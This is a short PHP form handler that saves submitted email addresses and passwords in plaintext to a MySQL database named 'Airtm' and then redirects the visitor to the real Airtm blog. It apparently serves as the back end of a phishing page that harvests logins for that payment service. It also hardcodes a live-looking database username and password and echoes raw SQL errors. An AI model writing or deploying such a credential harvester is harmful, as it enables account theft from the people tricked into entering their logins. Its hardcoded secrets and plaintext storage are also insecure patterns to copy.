<?php
// Database configuration
$servername = "127.0.0.1";  // IP address of the MySQL server (localhost)
$port = "3306";
$username = "u643844326_Mineth";
$password = "Wifikun412"; // Change this if your database has a password
$dbname = "u643844326_Airtm"; // Replace with your database name

// Create a connection
$conn = new mysqli($servername, $username, $password, $dbname, $port);

// Check the connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Check if the form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get email and password from the form
    $email = $conn->real_escape_string($_POST['email']);
    $password = $conn->real_escape_string($_POST['password']);


    // Insert email and password into the database
    $sql = "INSERT INTO users (email, password) VALUES ('$email', '$password')";

    if ($conn->query($sql) === TRUE) {
        header("Location: https://www.airtm.com/en/blog/");
        exit();
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }

    // Close the connection
    $conn->close();
}
?>
